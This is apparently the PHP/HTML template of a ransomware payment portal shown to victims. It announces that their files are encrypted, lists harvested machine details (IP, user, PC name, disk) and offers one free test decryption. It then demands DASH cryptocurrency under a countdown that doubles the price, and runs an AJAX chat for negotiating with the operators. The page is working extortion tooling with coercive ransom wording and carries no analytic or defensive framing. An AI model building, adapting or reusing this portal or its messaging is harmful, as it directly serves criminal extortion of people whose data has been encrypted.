<?php
//$data['page'] = 'chatting';
//var_dump($this->data);
$data['theme_url'] = $this->data['theme_url'];
$data['menu_url'] = $this->data['menu_url'];
$data['title'] = "Welcome";
?>

<!DOCTYPE html>
<html lang="en">
<script src="<?php echo $data['theme_url'];?>/assets//js/core/jquery.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/core/popper.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/core/bootstrap.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/moment.min.js"></script>
<!--  Plugin for Switches, full documentation here: http://www.jque.re/plugins/version3/bootstrap.switch/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-switch.js"></script>
<!--  Plugin for Sweet Alert -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/sweetalert2.min.js"></script>
<!--  Plugin for Sorting Tables -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.tablesorter.js"></script>
<!-- Forms Validations Plugin -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.validate.min.js"></script>
<!--  Plugin for the Wizard, full documentation here: https://github.com/VinceG/twitter-bootstrap-wizard -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.bootstrap-wizard.js"></script>
<!--	Plugin for Select, full documentation here: http://silviomoreto.github.io/bootstrap-select -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-selectpicker.js"></script>
<!--  Plugin for the DateTimePicker, full documentation here: https://eonasdan.github.io/bootstrap-datetimepicker/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-datetimepicker.js"></script>
<!--  DataTables.net Plugin, full documentation here: https://datatables.net/    -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.dataTables.min.js"></script>
<!--	Plugin for Tags, full documentation here: https://github.com/bootstrap-tagsinput/bootstrap-tagsinputs  -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-tagsinput.js"></script>
<!-- Plugin for Fileupload, full documentation here: http://www.jasny.net/bootstrap/javascript/#fileinput -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jasny-bootstrap.min.js"></script>
<!--  Full Calendar Plugin, full documentation here: https://github.com/fullcalendar/fullcalendar    -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/fullcalendar.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/daygrid.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/timegrid.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/interaction.min.js"></script>
<!-- Vector Map plugin, full documentation here: http://jvectormap.com/documentation/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery-jvectormap.js"></script>
<!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/nouislider.min.js"></script>
<!--  Google Maps Plugin    -->
<!-- Place this tag in your head or just before your close body tag. -->
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDGat1sgDZ-3y6fFe6HD7QUziVC6jlJNog"></script>
<!-- Chart JS -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/chartjs.min.js"></script>
<!--  Notifications Plugin    -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-notify.js"></script>
<!-- Control Center for Black Dashboard: parallax effects, scripts for the example pages etc -->
<script src="<?php echo $data['theme_url'];?>/assets//js/black-dashboard.min.js?v=1.1.1"></script>
<!-- Black Dashboard DEMO methods, don't include it in your project! -->
<script src="<?php echo $data['theme_url'];?>/assets//demo/demo.js"></script>
<!-- Sharrre libray -->
<script src="<?php echo $data['theme_url'];?>/assets//demo/jquery.sharrre.js"></script>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="apple-touch-icon" sizes="76x76" href="<?php echo $data['theme_url'];?>/assets/img/apple-icon.png">
    <!-- <link rel="icon" type="image/png" href="<?php echo $data['theme_url'];?>/assets/img/favicon.png"> -->
    <title>
        <?php echo $data['title'];?>
    </title>

    <!--     Fonts and icons     -->
    <link href="<?php echo $data['theme_url'];?>/assets/css/all.css" rel="stylesheet">
    <link href="<?php echo $data['theme_url'];?>/assets/css/icon.css" rel="stylesheet" />
    <!-- Nucleo Icons -->
    <!-- Nucleo Icons -->
    <link href="<?php echo $data['theme_url'];?>/assets/css/nucleo-icons.css" rel="stylesheet" />

    <!-- CSS Files -->
    <link href="<?php echo $data['theme_url'];?>/assets/css/black-dashboard.min.css?v=1.1.1" rel="stylesheet" />
    <!-- CSS Just for demo purpose, don't include it in your project -->
    <link href="<?php echo $data['theme_url'];?>/assets/demo/demo.css" rel="stylesheet" />

    <!--    <link rel="stylesheet" href="--><?php //echo $data['theme_url'];?><!--/assets/nc-demo_outline/demo/css/reset.css"> <!-- CSS reset -->
    <!--    <link rel="stylesheet" href="--><?php //echo $data['theme_url'];?><!--/assets/nc-demo_outline/demo/css/style.css">-->
    <?php
    if(!empty($data['page'])){
        require_once FCPATH."/ui/pages/".$data['page']."/header.php";
    }
    ?>
    <style type="text/css">
        #loading-indicator {
            position: fixed;
            left: 16%;
            top: 15%;
            z-index: 1000;
        }
        body {
                font-size: .275rem !important;
        }
        .text-center {
            font-size: 15px!important;
        }
        td,div,p {
             font-size: 10px!important;
        }
        .table {
            width: 100%;
            margin-bottom: 1px;
        }
        .h1, h1,.card {
           
            margin-bottom: 15px;
        }
        .table>tbody>tr>td, .table>tbody>tr>th, .table>tfoot>tr>td, .table>tfoot>tr>th, .table>thead>tr>td, .table>thead>tr>th {
    border-color: hsla(0,0%,100%,.1);
    padding: 7px 7px;
    vertical-align: middle;
}
    </style>
</head>
<body>
    <img src="<?php echo $data['theme_url'];?>/images/ajax-loader.gif" id="loading-indicator" style="display:none" />
    <div class="content pad-20px">
        <div class="row">
            <div class="col-md-6" id="left-half">
                <div class="pad-10px card full-height">
                    <div class="text-center color-red">Welcome!</div>
                    <div class="text-center color-red">ALL YOUR FILES  ARE ENCRYPTED!</div>
                    <table class="table table-bordered">
                        <tbody>
                        <tr>
                            <td><b>AS FAR AS WE KNOW:</b></td>
                        </tr>
                        </tbody>
                    </table>
                    <table class="table table-bordered">
                        <thead>
                        <tr></tr>
                        <tr></tr>
                        </thead>
                        <tbody>
                        <tr>
                            <td><b>Country</b></td>
                            <td>
                                <div>
                                    <img src="">
                                    <?php echo $this->device->country ." - ".$this->device->ipaddress;?>
                                </div>
                            </td>
                        </tr>
                        <tr>
                            <td><b>OS</b></td>
                            <td><?php echo $this->device->os?></td>
                        </tr>
                        <tr>
                            <td><b>PC User</b></td>
                            <td><?php echo $this->device->pc_user?></td>
                        </tr>
                        <tr>
                            <td><b>PC Name</b></td>
                            <td><?php echo $this->device->pc_name?></td>
                        </tr>
                         <tr>
                            <td><b>PC Lang</b></td>
                            <td><?php echo $this->device->pc_lang?></td>
                        </tr>
                       
                        <tr>
                            <td><b>HDD</b></td>
                            <td><?php echo $this->device->hdd?></td>
                        </tr>
                        </tbody>
                    </table>
                    <table class="table table-bordered">
                        <thead>
                        <tr></tr>
                        <tr></tr>
                        </thead>
                        <tbody>
                        <tr>
                            <td><b>Date of Encrypt</b></td>
                            <td><?php echo date("Y-m-d H:i:s",$this->device->createdAt)?></td>
                        </tr>
                        <tr>
                            <td><b>Amount of your files</b></td>
                            <td><?php if($this->device->file_count == 0) echo "2087"; else echo $this->device->file_count?></td>
                        </tr>
                        <tr>
                            <td><b>Volume of your files</b></td>
                            <td><?php if($this->device->file_volumn == 0) echo "1030241268"; else echo $this->device->file_volumn?> </td>
                        </tr>
                        </tbody>
                    </table>

                    
                    <div class="text-italic"><b>*But don't worry , you can return all your files! We can help you!</b></div>
                    <p>Below you can choose one of your encrypted file from your PC and decrypt him , it is test decryptor for you.</p>
                    <p><h6>But we can decrypt <span class="color-red"> Only 1 file for free.</span></h6></p>
                    
                    <div class="row">
                        <div class="col-md-6 col-sm-6 text-center">
                            <?php
                            if($this->device->av != ""){?>
                            <h4 class="card-title">You've already upload your testing file.</h4>
                            <?php } else{?>
                            <h5 class="card-title">Upload your test file.(Max file size: <b>2MB</b>)</h5>
                            <div class="fileinput fileinput-new text-center" data-provides="fileinput">
<!--                                <div class="fileinput-new thumbnail">-->
<!--                                    <img src="../../assets/img/image_placeholder.jpg" alt="No selected file.">-->
<!--                                </div>-->
                                <div class="fileinput-preview fileinput-exists thumbnail image-none"></div>
                                <div>
                                <span class="btn btn-rose btn-round btn-file">
                                  <span class="fileinput-new">Select File</span>
                                  <span class="fileinput-exists">Change</span>
                                  <input type="file" name="..." id="upload-input"/>
                                </span>
                                    <a class="btn btn-danger btn-round fileinput-exists" style="color: white;" onclick="onUpload()">Upload</a>
                                </div>
                            </div>
                            <?php }?>
                        </div>
                        <div class="col-md-6 col-sm-6 text-center">
                            <div class="color-red text-center">Attention</div>
                            <div>Don't try use third-party decryptor tools!</div>
                            <div>Because this will destroy your files!</div>
                        </div>
                    </div>
                   
                    <p>This process is fully automated, all payments is instant.</p>
                    <p>After your payment,  you can download  <b>Decryptor!</b></p>
                    <p>If you have any questions, please, don't hesitate, and write in CHAT NOW.</p>
                </div>

            </div>
            <div class="col-md-6" id="right-half">
                <div class="card pad-10px full-height">
                    <div>&nbsp</div>
                    <div class="btn-group btn-group-toggle float-right" data-toggle="buttons">
                        <label class="btn btn-sm btn-primary btn-simple active" id="0" onclick="onPageBuy()">
                            <input type="radio" name="options" checked>
                            <span class="d-none d-sm-block d-md-block d-lg-block d-xl-block">Buy the Decryptor.</span>
                            <span class="d-block d-sm-none">
                              <i class="tim-icons icon-single-02"></i>
                            </span>
                        </label>
                        <label class="btn btn-sm btn-primary btn-simple" id="1" onclick="onPageSupport()">
                            <input type="radio" class="d-none d-sm-none" name="options">
                            <span class="d-none d-sm-block d-md-block d-lg-block d-xl-block">CHAT NOW</span>
                            <span class="d-block d-sm-none">
                              <i class="tim-icons icon-gift-2"></i>
                            </span>
                        </label>
                        <!--                      <label class="btn btn-sm btn-primary btn-simple" id="2">-->
                        <!--                        <input type="radio" class="d-none" name="options">-->
                        <!--                        <span class="d-none d-sm-block d-md-block d-lg-block d-xl-block">Sessions</span>-->
                        <!--                        <span class="d-block d-sm-none">-->
                        <!--                          <i class="tim-icons icon-tap-02"></i>-->
                        <!--                        </span>-->
                        <!--                      </label>-->
                    </div>
                   
                    <div id="page-buy" class="">
                        <div class="text-italic"><b>*What do your need?</b></div>
                        <p>You need a <b>Decryptor.</b></p>
                        <p>This software will decrypt all your encrypted files and will delete ransomware from your PC.</p>
                        <p>For purchase you need crypto-currency <a class=""  href="https://en.wikipedia.org/wiki/Dash_(cryptocurrency)">DASH</a><b> .</b></p>
                        <p>How to buy this currency you can <a href="https://www.dash.org/where-to-buy/">read it here.</a></p>
                      
                        <div class="text-italic"><b>* How much money you need to pay? Below we are specified amount and our wallet for payment</b></div>
                        <div class="card pad-1px back-black text-center" style="background:#1e1e2f">
                            <p>- Price -</p>
                           
                            <h1 class="" style="color:chartreuse"><b id="price"><?= $this->device->price?> USD</b></h1>
                        </div>
                        <?php 
                          if($this->device->status ==="Payed&Decrypted"){
                        ?>
                            <div class="card pad-1px back-black text-center" style="background:#1e1e2f">
                            <p>- Software for Decryptor (Click below and download decryptor) -</p>
                            
                            <h2 class="" style="color:chartreuse"><a href="<?php echo base_url()."upload/decrypted/".$this->device->decryptor?>"><b>Download Decryptor</b></a></h2>
                            </div>
                        <?php  }
                          else{ ?>
                            <div class="card pad-1px back-black text-center" style="background:#1e1e2f">
                            <p>- Click PAY NOW below to pay and download decryptor - </p>
                           
                            <h2 class="" style="color:chartreuse"><a href="<?php echo base_url().'frontend/main/dashpay?key='.$this->device->price_encrypted ?>"><b>PAY NOW</b></a></h2>
                            </div>
                        
                        <div class="card pad-1px back-black text-center" style="background:#1e1e2f">
                            <p>- To make a payment , you have this time -</p>
                            <div class="row pad-10px">
                                <div class="col-md-3 pad-10px">
                                    <div class="card pad-10px">
                                        <h1 class="card pad-10px" style="background:#1e1e2f"><b class="color-red" id="remain-d"><?= $this->device->remaining->d?></b></h1>
                                        DAYS
                                    </div>
                                </div>
                                <div class="col-md-3 pad-10px">
                                    <div class="card pad-10px">
                                        <h1 class="card pad-10px" style="background:#1e1e2f"><b class="color-red" id="remain-h"><?= $this->device->remaining->h?></b></h1>
                                        HOURS
                                    </div>
                                </div>
                                <div class="col-md-3 pad-10px">
                                    <div class="card pad-10px">
                                        <h1 class="card pad-10px" style="background:#1e1e2f"><b class="color-red" id="remain-i"><?= $this->device->remaining->i?></b></h1>
                                        MINUTES
                                    </div>
                                </div>
                                <div class="col-md-3 pad-10px">
                                    <div class="card pad-10px">
                                        <h1 class="card pad-10px" style="background:#1e1e2f"><b class="color-red" id="remain-s"><?= $this->device->remaining->s?></b></h1>
                                        SECONDS
                                    </div>
                                </div>
                            </div>
                            <p>- After this time this amount will be doubled. -</p>
                           
                            <h1 class="" style="color:chartreuse"><b id="doubled-price"><?= $this->device->discount * 2?> USD</b></h1>
                        </div>
                        <?php
                          }
                        ?>
                    </div>
                    <div id="page-support" class="hidden" style="height: 94%;">
                        <div class="pad-10px" style="height: 80%;">
                            <div class=" pad-b-50px full-height position-relative">
                                <div class="back-black full-height overflow-y-scroll overflow-x-hidden" id="message-box">

                                </div>
                                <input id="message_content" type="text" class="form-control position-absolute bottom-0" placeholder="Type Your Message Here">
                                <button type="button" class="btn btn-icon position-absolute bottom-0 margin-0 right-0 width-unset" onclick="onMessageSend()">&nbspSend&nbsp</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
</body>

<script>
var messageBox ;
var previousUserId = -1;
var tableName = "";
var userId = -1;
var interval;
var interval_message;
var history;
var last_id = {};

var hwid = "<?php echo  $hwid ?>";
var is_chat_possible = false;
$(document).ready(function() {
    console.log("Document Ready!");
    messageBox =  $('#message-box');
    loadHistory();
    console.log($("#left-half").height());
    $("#right-half").css('height' , $("#left-half").height() + "px");
//    $("#left-half").css('height' , $("#left-half").height() + "px");
});

function onPageBuy(){
    console.log("Page Buy");
    $("#page-buy").removeClass("hidden");
    $("#page-support").addClass("hidden");
    interval = setInterval(function (){
        getRemainTime();
    } , 30000);

    // if(interval_message != undefined){
    //     clearInterval(interval_message);
    // }
     is_chat_possible = false;
}

function onPageSupport(){
    console.log("Page Support");
    $("#page-buy").addClass("hidden");
    $("#page-support").removeClass("hidden");
    if(interval != undefined){
        clearInterval(interval);
    }
    is_chat_possible = true;
    getMessages(tableName , last_id[tableName]);
}


function loadHistory(){
    tableName = '<?php echo $this->device->hwid?>';

    if(interval != undefined){
        clearInterval(interval);
    }

    if( history[tableName] == undefined ){
        history[tableName] = "";
        last_id[tableName] = "-1";
//            console.log(last_id);
        //getMessages(tableName , -1);
    }
    interval = setInterval(function (){
        getRemainTime();
    } , 60000);
}
     function formatChatTime(d) {

               month = '' + (d.getMonth() + 1),
               day = '' + d.getDate(),
               year = d.getFullYear();
               hour = d.getHours();
               min = d.getMinutes();
               ss = d.getSeconds();

                if (month.length < 2) month = '0' + month;
                if (day.length < 2) day = '0' + day;
                date = [year, month, day].join('-');
                time = [hour, min].join(':')
                return time;
      }
function getMessages( tablename , lastid){
    var params = {
        action:'get_message',
        data: {
            tablename: tableName,
            lastid: lastid,
            userid: userId,
        }
    };

    $.ajax({
        url: "main/ajax_call",
        type: "POST",
        dataType: "json",
        data: params,
        success: function onSuccess(res){
//                console.log("Message Get Successed!");
//                console.log(res);
            var isInit = false;
            if(history[tableName] == ""){
                isInit = true;
            }
            for(var i=0;i<res.length;i++){
//                    console.log(res[i]);
                res[i]['message'] = res[i]['message'].replace('~b' , "'");
                
                var date = new Date(res[i]['send_date']);
                var strtime = formatChatTime(date);
                console.log(strtime)
                var str_class = (res[i]['from'] == userId) ? 'btn-primary chatting-right' : 'chatting-left';
                var timeclass = (res[i]['from'] == userId) ? 'chatting-right' : 'chatting-left';
                history[tableName] +="<div class='row'><div class='col-md-12 display-block'>";
                history[tableName] +="<p class='" + str_class + "'>" + res[i]['message'] + "";
                history[tableName] +="<span style='margin-left:15px;margin-left:15px;' class='" + "" + "'>(" + strtime + ")</span>";
                history[tableName] += "</p></div></div>";
                isInit = true;
            }
            try{
                last_id[tableName] = res[res.length -1]['id'];
            } catch(e){}

            if(messageBox.scrollTop > messageBox.scrollHeight - messageBox.offsetHeight - 5 || isInit){
                isInit = true;
            }
            $('#message-box').html(history[tableName]);
            if(isInit){
                scrollToBottom();
            }
            if(is_chat_possible) setTimeout(getMessages(tableName , last_id[tableName]),1000);
        },
        error: function onError(res){
            console.log("Message Get Error!");
            console.log(res);
            if(is_chat_possible) setTimeout(getMessages(tableName , last_id[tableName]),1000);
        }
    })
}

function getRemainTime(){
    var params = {
        action:'get_remain',
        data: {
            hwid : '<?php echo $this->device->hwid;?>'
        }
    };

    $.ajax({
        url: "main/ajax_call",
        type: "POST",
        dataType: "json",
        data: params,
        success: function onSuccess(res){
//                console.log("Get Remain");
//                console.log(res);
            $('#remain-d').html(res['remaining']['d']);
            $('#remain-h').html(res['remaining']['h']);
            $('#remain-i').html(res['remaining']['i']);
            $('#remain-s').html(res['remaining']['s']);
            $('#price').html(res['price'] + " USD");
            var next_price = res['price'] * 2;
            var max_price = res['discount'] * 2;
            if(next_price >max_price ) next_price = max_price;
            $('#doubled-price').html(next_price + " USD");
        },
        error: function onError(res){
            console.log("Get Remain Error!");
            console.log(res);
        }
    });
}

function onMessageSend(){
    var msg = $('#message_content').val();
    msg = msg.replace("'" , "~b");
    console.log(msg);
    var trimStr = $.trim(msg);
    if(trimStr == "") return;
    var params = {
        action:'send_message',
        data: {
            tablename: tableName,
            userid: userId,
            message: msg,
        }
    };

    $.ajax({
        url: "main/ajax_call",
        type: "POST",
        dataType: "json",
        data: params,
        success: function onSuccess(res){
               // console.log("Message Sent Successed!");
               // console.log(res);
            $('#message_content').val("");
            scrollToBottom();
        },
        error: function onError(res){
            //console.log("Error in message send!");
             showError('bottom','center',"Error in message send!",3000);
            console.log(res);
        }
    })
}

function scrollToBottom(){
    //messageBox.scrollTop = messageBox.scrollHeight - messageBox.offsetHeight;
    console.log("scrollToBottom")
    messageBox.scrollTop(messageBox.prop("scrollHeight"));
    //messageBox.animate({ scrollTop: messageBox.scrollHeight}, 1000);
}

var input = document.getElementById("message_content");
input.addEventListener("keypress", function(event) {
    if (event.keyCode != 13) {
        return;
    }
    onMessageSend();
});

function onUpload(){
    files = $("#upload-input").prop("files");
    if(files.length > 0 ){

        var formData = new FormData();
        formData.append("file", files[0]);

        var xhttp = new XMLHttpRequest();
         $('#loading-indicator').show();
        // Set POST method and ajax file path
        xhttp.open("POST", "../api/upload_file.php", true);
        
        // call on request changes state
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                 showNotification('bottom','center',"File Upload Successed!",3000);
                var response = this.responseText;
                var params = {
                    action: "upload_file",
                    data: {
                        hwid: hwid,
                        file: response,
                    }
                };
                $.ajax({
                    url: "main/ajax_call",
                    type: "POST",
                    dataType: "json",
                    data: params,
                    success: function onSuccess(res){
                       
                       
                        $('#loading-indicator').hide();
                        if(res.result == "ok"){
                            var url = res.data;
                           downloadURI(url,"");
                           location.reload();
                        }
                        else{
                            showError('bottom','center',res.result,3000);
                        }
                       
                    },
                    error: function onError(res){
                        $('#loading-indicator').hide();
                        showError('bottom','center',res,3000);
                       
                    }
                })
            }
        };

        // Send request with data
        xhttp.send(formData);

    }else{
        alert("Please select a file");
    }
    function downloadURI(uri, name) 
    {
        var link = document.createElement("a");
        // If you don't know the name or want to use
        // the webserver default set name = ''
        link.setAttribute('download', name);
        link.href = uri;
        document.body.appendChild(link);
        link.click();
        link.remove();
    }
   function showNotification(from, align,msg,time) {
        color = 2;//Math.floor((Math.random() * 4) + 1);

        $.notify({
        icon: "tim-icons icon-bell-55",
        message: msg

        }, {
        type: type[color],
        timer: time,
        placement: {
            from: from,
            align: align
        }
        });
  }
  function showError(from, align,msg,time) {
        color = 1;//Math.floor((Math.random() * 4) + 1);

        $.notify({
        icon: "tim-icons icon-bell-55",
        message: msg

        }, {
        type: type[color],
        timer: time,
        placement: {
            from: from,
            align: align
        }
        });
  }
  function showWarring(from, align,msg,time) {
        color = 3;//Math.floor((Math.random() * 4) + 1);

        $.notify({
        icon: "tim-icons icon-bell-55",
        message: msg

        }, {
        type: type[color],
        timer: time,
        placement: {
            from: from,
            align: align
        }
        });
  } 
    //Loading image show and search condition control
    // $(document).ajaxSend(function(event, request, settings) {
    //     $('#loading-indicator').show();
    // });
    // $(document).ajaxComplete(function(event, request, settings) {
    //     $('#loading-indicator').hide();
    // });
    }
</script>